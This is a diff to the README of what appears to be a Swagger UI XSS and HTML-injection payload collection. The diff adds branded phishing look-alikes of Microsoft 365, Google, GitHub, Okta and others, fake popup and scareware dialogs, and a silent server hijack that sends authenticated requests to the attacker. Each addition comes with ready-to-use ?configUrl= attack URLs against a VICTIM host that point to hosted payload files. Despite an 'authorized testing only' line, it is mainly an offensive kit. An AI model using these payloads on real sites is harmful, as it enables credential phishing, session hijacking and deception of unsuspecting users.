@@ -1,6 +1,6 @@
 # Swagger UI Payload Collection
 
-A collection of 44 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.
+A collection of 67 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.
 
 > **Authorized security testing only.** Use only on targets you have permission to test (bug bounty in-scope, VDP, pentest engagement). Report findings through responsible disclosure.
 
@@ -80,15 +80,22 @@ Fake login forms rendered inside the real Swagger UI page. The form `action` poi
 
 | Payload | What it looks like | What it captures |
 |---|---|---|
-| `login-basic` | "Login to Swagger" error page with login form | username + password |
-| `login-sso-corporate` | Corporate SSO re-authentication screen | email + password |
-| `login-mfa-otp` | Two-factor verification screen | 6-digit OTP code |
-| `login-password-reset` | "Password expired" reset screen | old + new password |
-| `login-api-key` | "API key expired" screen | API key + email |
-| `login-aws-console` | AWS console sign-in look-alike | IAM credentials |
-| `login-vpn-portal` | VPN gateway login | user + pass + OTP |
-| `login-db-admin` | phpMyAdmin login | database credentials |
+| `login-basic` | "Login to Swagger" full-page branded error screen | username + password |
+| `login-sso-corporate` | Corporate SSO re-auth screen with gradient branding | email + password |
+| `login-mfa-otp` | Two-factor verification screen with OTP input boxes | 6-digit OTP code |
+| `login-password-reset` | "Password expired" corporate reset screen | old + new password |
+| `login-api-key` | GitHub-dark style "401 Unauthorized" token re-activation screen | API key + email |
+| `login-aws-console` | AWS Management Console look-alike (dark navy header, orange sign-in) | IAM credentials |
+| `login-vpn-portal` | Cisco AnyConnect VPN gateway login with group selector | user + pass + group |
+| `login-db-admin` | phpMyAdmin 5.2.1 look-alike with server pre-filled | database credentials |
 | `login-windows-popup` | Windows Security dialog look-alike | domain credentials |
+| `login-office365` | Microsoft 365 "Sign in" look-alike — exact MS layout + blue CTA | email + password |
+| `login-google` | Google Account sign-in look-alike — Material Design, rounded Next button | email + password |
+| `login-github` | GitHub sign-in look-alike — octocat, bordered field groups, green CTA | username + password |
+| `login-okta` | Okta sign-in look-alike — Okta blue, "Partner API Portal" | email + password |
+| `login-cloudflare` | Cloudflare dashboard look-alike — orange branding | email + password |
+| `login-slack` | Slack workspace sign-in look-alike — purple branding + Google SSO button | email + password |
+| `login-jira` | Atlassian/Jira look-alike — blue branding | email + password |
 
 ```http
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-basic.json
@@ -100,6 +107,13 @@ https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/Rekha
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-vpn-portal.json
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-db-admin.json
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-windows-popup.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-google.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-github.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-okta.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-cloudflare.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-slack.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-jira.json
 ```
 
 ## 4. Beacons / Delivery Confirmation (`img-*.json`)
@@ -184,6 +198,56 @@ https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/Rekha
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-marquee.json
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-table-spoof.json
 https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-iframe-probe.json
+```
+
+## 9. Popup Dialogs (`popup-*.json`)
+
+Fake modal dialogs rendered on top of the page (pure HTML — works on modern Swagger UI). Users interact with them thinking they are real system dialogs.
+
+| Payload | What it does | Captures |
+|---|---|---|
+| `popup-alert` | Fake security alert modal with "Continue to Login" | click-through → login chain |
+| `popup-confirm` | Fake "Are you sure?" confirmation dialog | confirmation click |
+| `popup-cookie-consent` | Fake cookie consent banner — Accept button posts to your webhook | consent click + webhook hit |
+| `popup-session-expired` | "Session timed out" modal with re-login form | username + password |
+| `popup-update-available` | Fake "critical update available" dialog | click + webhook hit |
+| `popup-notification` | Browser-style "new sign-in detected" notification | review click |
+| `popup-scareware` | "Suspicious activity — access revoked in 10 min" panic dialog | urgent click |
+| `popup-captcha` | Fake CAPTCHA verification | solved code |
+| `popup-download-ready` | "Your export accounts.csv is ready" — download bait | download click beacon |
+| `popup-fullscreen-lock` | Fullscreen black "ACCESS LOCKED" screen | scare + page takeover |
+| `popup-chrome-update` | Fake browser update banner at top of page | update click |
+| `popup-feedback` | "Rate this API" widget | typed feedback |
+| `popup-oauth-qr` | Fake QR-code authentication modal | 8-digit auth code |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-alert.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-confirm.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-cookie-consent.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-session-expired.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-update-available.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-notification.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-scareware.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-captcha.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-download-ready.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-fullscreen-lock.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-chrome-update.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-feedback.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-oauth-qr.json
+```
+
+## 10. Heavyweight / Dangerous Extras
+
+| Payload | What it does |
+|---|---|
+| `creds-mega-form` | All-in-one capture form — username + password + API key + 2FA code in a single "verification" screen |
+| `server-hijack-silent` | Completely silent server hijack — no visible payload, the description looks like normal docs, but every Try-it-out request (with auth headers) goes to your server |
+| `beacon-multipixel` | 10 tracking pixels + markdown beacon + rendered banner image — maximum delivery telemetry |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/creds-mega-form.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-silent.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/beacon-multipixel.json
 ```
 
 ---
